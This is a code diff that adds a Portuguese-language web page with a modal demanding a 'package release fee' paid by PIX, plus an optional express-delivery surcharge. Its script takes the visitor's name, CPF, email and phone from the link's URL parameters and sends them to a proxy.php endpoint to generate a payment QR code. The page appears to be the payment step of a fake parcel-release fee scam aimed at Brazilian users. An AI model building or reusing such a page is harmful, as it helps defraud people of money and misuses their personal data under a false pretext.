@@ -1,0 +1,196 @@
+<style>
+  /* ... outros estilos ... */
+  
+  .loading {
+    display: none;
+    text-align: center;
+    padding: 20px;
+  }
+
+  .loading-spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #3498db;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* Estilos do Modal */
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    overflow: auto;
+  }
+
+  .modal-content {
+    background-color: #fefefe;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+    max-width: 500px;
+    border-radius: 8px;
+    position: relative;
+  }
+
+  .close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+  }
+
+  .close:hover,
+  .close:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+  }
+</style>
+
+<div id="resumoModal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="closeModal('resumoModal')">&times;</span>
+    <h2>Resumo da Taxa de Liberação</h2>
+    <p>Para finalizar a liberação do seu pacote, efetue o pagamento da taxa.</p>
+
+    <div class="box">
+      <label><strong>Taxa de liberação:</strong> R$ 53,96</label><br>
+      <label>
+        <input type="checkbox" id="sedex24"> SEDEX 24H (Entrega hoje) + R$ 28,00
+      </label><br>
+      <strong>Total: </strong> <span id="total">R$ 53,96</span>
+    </div>
+
+    <div id="loadingPix" class="loading hidden">
+      <div class="spinner"></div>
+      <p>Gerando código PIX...</p>
+    </div>
+
+    <div id="pix-info" class="hidden">
+      <div id="qrcode"></div>
+      <p><strong>Código PIX:</strong></p>
+      <textarea id="pix-code" readonly></textarea>
+      <button id="copiar-pix" class="btn">Copiar Código do PIX</button>
+    </div>
+
+    <button id="gerar-pix" class="btn">Gerar PIX</button>
+    <button id="fechar" class="btn btn-secondary">Fechar</button>
+  </div>
+</div>
+
+<button id="openResumoBtn" onclick="openModal('resumoModal')">LIBERAR MEU PRODUTO</button>
+
+<script>
+// Funções para controle do modal
+function openModal(modalId) {
+  document.getElementById(modalId).style.display = 'block';
+}
+
+function closeModal(modalId) {
+  document.getElementById(modalId).style.display = 'none';
+}
+
+// Fechar modal ao clicar fora dele
+window.onclick = function(event) {
+  if (event.target.classList.contains('modal')) {
+    event.target.style.display = 'none';
+  }
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+    const sedex24 = document.getElementById('sedex24');
+    const totalSpan = document.getElementById('total');
+    const gerarPixBtn = document.getElementById('gerar-pix');
+    const loadingPix = document.getElementById('loadingPix');
+    const pixInfo = document.getElementById('pix-info');
+    const pixCode = document.getElementById('pix-code');
+    const copiarPixBtn = document.getElementById('copiar-pix');
+    
+    let totalAmount = 53.96;
+
+    // Atualizar total quando checkbox mudar
+    sedex24.addEventListener('change', function() {
+        totalAmount = this.checked ? 81.96 : 53.96;
+        totalSpan.textContent = `R$ ${totalAmount.toFixed(2)}`;
+    });
+
+    // Gerar PIX
+    gerarPixBtn.addEventListener('click', function() {
+        loadingPix.classList.remove('hidden');
+        pixInfo.classList.add('hidden');
+        
+        const nomeCliente = getParameterByName('nome') || 'Cliente';
+        const cpfCliente = getParameterByName('cpf') || '12345678900';
+        const emailCliente = getParameterByName('email') || 'cliente@exemplo.com';
+        const telefoneCliente = getParameterByName('telefone') || '11999999999';
+
+        fetch('proxy.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                paymentMethod: 'pix',
+                customer: {
+                    document: { type: 'cpf', number: cpfCliente },
+                    name: nomeCliente,
+                    email: emailCliente,
+                    phone: telefoneCliente
+                },
+                amount: Math.round(totalAmount * 100), // Convertendo para centavos
+                pix: { expiresInDays: 1 },
+                items: [{
+                    title: 'Taxa de Liberação',
+                    unitPrice: Math.round(totalAmount * 100),
+                    quantity: 1,
+                    tangible: false
+                }]
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            loadingPix.classList.add('hidden');
+            
+            if (data.pix && data.pix.qrcode) {
+                const qrcode = new QRCode(document.getElementById('qrcode'), {
+                    text: data.pix.qrcode,
+                    width: 200,
+                    height: 200
+                });
+                
+                pixCode.value = data.pix.qrcode;
+                pixInfo.classList.remove('hidden');
+            } else {
+                throw new Error('Dados do PIX inválidos');
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao gerar PIX:', error);
+            loadingPix.classList.add('hidden');
+            alert('Erro ao gerar o PIX. Por favor, tente novamente.');
+        });
+    });
+
+    // Copiar código PIX
+    copiarPixBtn.addEventListener('click', function() {
+        pixCode.select();
+        document.execCommand('copy');
+        alert('Código PIX copiado!');
+    });
+});
+</script> 
